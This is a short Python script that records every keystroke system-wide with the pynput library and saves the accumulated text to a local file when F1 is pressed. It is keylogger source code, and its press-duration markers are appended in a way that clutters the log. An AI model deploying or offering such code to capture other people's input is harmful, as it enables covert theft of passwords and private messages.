import pynput
from pynput.keyboard import Key, Listener
import time

log = ""

def on_press(key):
    global log, start_time
    current_key = str(key)
    if current_key == 'Key.space':
        log += ' '
    elif current_key == 'Key.enter':
        log += '\n'
    elif current_key == 'Key.shift':
        log += 'shift'
    elif current_key == 'Key.ctrl':
        log += 'ctrl'
    elif current_key == 'Key.alt':
        log += 'alt'
    elif current_key == 'Key.esc':
        log += 'esc'
    elif current_key == 'Key.backspace':
        log = log[:-1]
    else:
        try:
            log += current_key[1]
        except:
            log += current_key
    start_time = time.time()

def on_release(key):
    global log, start_time
    if key == Key.f1:
        with open("text.txt", "w") as f:
            f.write(log)
        log = ""
    end_time = time.time()
    if end_time - start_time > 0.5:
        log += 'long_press'
    else:
        log += 'short_press'

def main():
    global start_time
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()